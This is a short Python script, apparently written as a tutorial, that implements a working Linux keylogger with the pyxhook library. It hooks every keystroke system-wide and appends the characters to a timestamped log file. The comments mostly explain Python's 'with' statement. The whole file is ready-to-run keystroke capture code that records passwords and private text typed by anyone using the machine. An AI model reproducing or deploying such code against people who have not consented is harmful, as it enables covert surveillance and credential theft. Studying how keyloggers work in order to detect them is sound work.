import os
from datetime import datetime
import pyxhook

def main():
    # Creating logfile
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    def OnKeyPress(event):
        # with helps in resource management
        # It ensures any resources are not left open by closing them right after processing
        # with is usually a replacement for commonly used try/finally error handling statements.
        with open(log_file, "a") as f:
            # with statement closes the file automatically after processing.
            if event.Key == 'P_enter':
                f.write('\n')
            else:
                # Write to the file and convert to ascii to readable character
                f.write(f'{chr(event.Ascii)}')

    # Create new hook manager object
    hook = pyxhook.HookManager()
    # On each key down, process the OnKeyPress function
    hook.KeyDown = OnKeyPress

    hook.HookKeyboard() # set the hook to keyboard

    try:
        # start the hook
        hook.start()
    except KeyboardInterrupt :
        # If there is interruption from keyboard (User interruption to stop)
        hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions other than keyboard interrupts to the log file.
        msg = f"Error while catching events:\n{ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()